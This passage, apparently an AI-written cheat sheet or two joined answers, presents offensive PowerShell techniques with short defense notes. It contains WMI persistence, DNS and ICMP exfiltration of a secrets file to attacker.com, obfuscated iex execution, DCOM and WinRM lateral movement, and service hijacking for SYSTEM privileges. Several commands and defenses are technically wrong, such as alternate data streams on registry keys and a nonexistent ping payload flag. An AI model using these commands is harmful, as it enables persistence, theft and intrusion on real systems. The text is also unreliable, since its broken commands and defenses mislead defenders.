- **Defense**: Audit tasks with `Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }`.  

#### **C. WMI Event Subscription**  
```powershell  
$filterArgs = @{Name='MaliciousFilter'; EventNameSpace='root\CimV2'; Query="SELECT * FROM __InstanceModificationEvent"};  
$filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterArgs  
```  
- **Impact**: Triggers payloads on system events (e.g., process creation).  
- **Defense**: Disable WMI via `Disable-WSMan`.  

---

### **4. "Unblockable" Techniques**  
*(Bypass common restrictions)*  

#### **A. DNS Exfiltration**  
```powershell  
# Exfiltrate data via DNS queries  
Resolve-DnsName -Name "$([Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\secrets.txt'))).attacker.com" -Type TXT  
```  
- **Why Unblockable?**: DNS is rarely blocked outright.  
- **Defense**: Monitor DNS for base64 patterns.  

#### **B. Living-off-the-Land (LOLBins)**  
```powershell  
# Use legitimate tools like msbuild.exe to execute code  
msbuild.exe C:\malware.xml  
```  
- **Why Unblockable?**: Uses trusted Microsoft binaries.  
- **Defense**: Restrict execution of LOLBins via AppLocker.  

#### **C. PowerShell Constrained Language Mode Escape**  
```powershell  
# Bypass CLM via .NET reflection  
Add-Type -TypeDefinition @"  
using System;  
public class CLMBypass { public static void Main() { System.Diagnostics.Process.Start("cmd.exe"); } }  
"@  
[CLMBypass]::Main()  
```  
- **Why Unblockable?**: Escapes PowerShell’s security sandbox.  
- **Defense**: Enforce **Constrained Language Mode** via GPO.  

---

### **How to Defend Against "Unstoppable" Commands**  
1. **Layered Security**:  
   - **EDR/XDR**: Tools like CrowdStrike or Microsoft Defender for Endpoint.  
   - **Network Segmentation**: Limit lateral movement.  
2. **Harden PowerShell**:  
   ```powershell  
   Set-ExecutionPolicy Restricted  
   $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
   ```  
3. **Enable Logging**:  
   ```powershell  
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1  
   ```  
4. **Patch & Update**: Apply Windows updates and disable legacy protocols (e.g., NTLM, SMBv1).  

---





Here’s a curated list of **advanced, lesser-known PowerShell commands and techniques** with real-world applications in cybersecurity, paired with defensive countermeasures. These highlight PowerShell’s depth and potential risks, while emphasizing ethical use:

---

### **1. Stealthy Persistence Mechanisms**
#### **A. Hidden Registry Run Keys (NTFS Alternate Data Streams)**
```powershell
# Store malware path in a hidden ADS stream
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\malware.exe" -Stream "EvilStream"
```
- **Purpose**: Hides persistence mechanisms from standard registry viewers.
- **Defense**:  
  ```powershell
  # Detect hidden streams
  Get-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Stream *
  ```
  - Use tools like **Sysinternals Autoruns** with stream-scanning enabled.

#### **B. WMI Event Subscription**
```powershell
# Trigger payload on process creation
$FilterArgs = @{Name='MaliciousFilter'; EventNameSpace='root\CimV2'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"};
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs;
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{Name='MaliciousConsumer'; CommandLineTemplate="cmd.exe /c malware.exe"};
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=$Filter; Consumer=$Consumer};
```
- **Purpose**: Executes code when specific events (e.g., new processes) occur.
- **Defense**:  
  ```powershell
  # Audit WMI subscriptions
  Get-CimInstance -Namespace root/subscription -ClassName __EventFilter
  Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer
  ```

---

### **2. Evasion & Obfuscation**
#### **A. XOR Obfuscation with Dynamic Decryption**
```powershell
# XOR-encrypt and execute a payload
$key = 0x55
$encrypted = [System.Text.Encoding]::UTF8.GetBytes('malicious code') | % { $_ -bxor $key }
$decrypted = $encrypted | % { $_ -bxor $key }
iex ([System.Text.Encoding]::UTF8.GetString($decrypted))
```
- **Purpose**: Evades signature-based detection.
- **Defense**: Enable **AMSI** and script block logging.

#### **B. Environment Variable Obfuscation**
```powershell
# Hide commands in environment variables
$env:EvilVar = 'malicious code'; iex $env:EvilVar
```
- **Purpose**: Avoids hardcoding commands in scripts.
- **Defense**:  
  ```powershell
  # Monitor env variables
  Get-ChildItem Env: | Where-Object { $_.Value -match 'malicious' }
  ```

---

### **3. Lateral Movement**
#### **A. PowerShell Remoting (WinRM)**
```powershell
# Execute code on a remote machine
Invoke-Command -ComputerName TARGET -ScriptBlock { Start-Process C:\malware.exe } -Credential (Get-Credential)
```
- **Purpose**: Spread malware via trusted administrative channels.
- **Defense**:  
  ```powershell
  # Disable WinRM
  Disable-PSRemoting -Force
  ```

#### **B. DCOM Lateral Movement**
```powershell
# Abuse MMC20.Application COM object
$com = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c malware.exe", "7")
```
- **Purpose**: Executes code remotely via DCOM.
- **Defense**: Disable DCOM via `dcomcnfg`.

---

### **4. Data Exfiltration**
#### **A. ICMP Covert Channel**
```powershell
# Exfiltrate data via ICMP packets
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt"))
ping -n 1 -l 1000 -w 1 attacker.com -p $data
```
- **Purpose**: Bypass firewalls using "benign" ICMP traffic.
- **Defense**: Block oversized ICMP payloads.

#### **B. Steganography with NTFS Streams**
```powershell
# Hide data in image Alternate Data Streams
Add-Content -Path "C:\image.jpg" -Value (Get-Content C:\secrets.txt) -Stream "HiddenData"
```
- **Purpose**: Stores stolen data in ADS to evade casual inspection.
- **Defense**:  
  ```powershell
  # Detect ADS streams
  Get-Item -Path C:\image.jpg -Stream *
  ```

---

### **5. Privilege Escalation**
#### **A. Token Impersonation**
```powershell
# Steal SYSTEM token (like Linux SUID abuse)
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```
- **Purpose**: Gain SYSTEM-level privileges.
- **Defense**: Restrict `SeDebugPrivilege` via Group Policy.

#### **B. Service Binary Hijacking**
```powershell
# Replace a service binary
sc.exe config VulnerableService binPath= "C:\malware.exe"
sc.exe start VulnerableService
```
- **Purpose**: Execute code as SYSTEM.
- **Defense**:  
  ```powershell
  # Audit service binaries
  Get-WmiObject -Class Win32_Service | Select-Object Name, PathName
  ```

---

### **6. Defense & Detection**
#### **A. Hunt for Malicious PowerShell Activity**
```powershell
# Find encoded commands in logs
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | 
  Where-Object { $_.Message -match "EncodedCommand" }
```

#### **B. Enable Deep Process Monitoring**
```powershell
# Log all process creations (like auditd in Linux)
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1
```

---

### **Key Takeaways**
- **PowerShell is a Swiss Army Knife**: It can be used for both attack and defense.  
- **No Technique is Truly "Unstoppable"**: Layered defenses (logging, EDR, hardening) can mitigate even advanced attacks.  
- **Ethical Use is Critical**: Always test in isolated environments (e.g., **Windows Sandbox**, **FlareVM**).  

---

### **Linux-to-PowerShell Analogy Cheat Sheet**
| **Linux Command**         | **PowerShell Equivalent**                      |  
|----------------------------|-----------------------------------------------|  
| `crontab -e`               | `Register-ScheduledTask`                      |  
| `ldconfig` (LD_PRELOAD)    | `Add-Type` (DLL injection)                    |  
| `tcpdump`                  | `Get-NetTCPConnection`                        |  
| `/proc/<PID>/mem`          | `Get-Process | Select-Object -ExpandProperty Modules` |  

---


